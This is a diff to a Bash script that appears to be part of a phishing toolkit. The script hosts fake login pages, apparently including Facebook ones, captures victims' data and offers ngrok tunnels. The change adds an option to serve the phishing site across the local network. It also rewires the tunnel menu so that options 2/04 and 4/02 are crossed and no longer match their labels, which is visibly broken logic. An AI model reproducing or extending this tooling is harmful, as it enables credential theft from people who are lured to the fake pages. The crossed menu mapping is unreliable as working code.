@@ -295,6 +295,18 @@ start_localhost() {
 	capture_data
 }
 
+start_localnetwork() {
+    export HOST="$(hostname -I | awk '{print $1}')"  # تعيين IP الشبكة المحلية
+    echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    setup_site
+    { sleep 1; clear; banner_small; }
+    echo -e "\n${RED}[${WHITE}*${RED}]${GREEN} Successfully Hosted at : ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    capture_data
+}
+
+
+
+
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -303,21 +315,24 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${GREEN} Localhost ${RED}[${CYAN}For Devs Only${RED}]
 		${RED}[${WHITE}02${RED}]${GREEN} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
 		${RED}[${WHITE}03${RED}]${GREEN} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]
-
+		${RED}[${WHITE}04${RED}]${GREEN} localnetwork ${RED}[${CYAN}On The Network${RED}]
 	EOF
 
 	read -p "${RED}[${WHITE}*${RED}]${BLUE} Select a port forwarding service : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		start_localhost
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		start_localhost  # تشغيل على 127.0.0.1
+	elif [[ "$REPLY" == 2 || "$REPLY" == 04 ]]; then
 		start_ngrok "ngrok2" "Launching Ngrok Patched..."
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
+	elif [[ "$REPLY" == 4 || "$REPLY" == 02 ]]; then
+		start_localnetwork  # تشغيل على الشبكة المحلية (192.168.x.x)
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
 	fi
+
 }
 
 ## Facebook
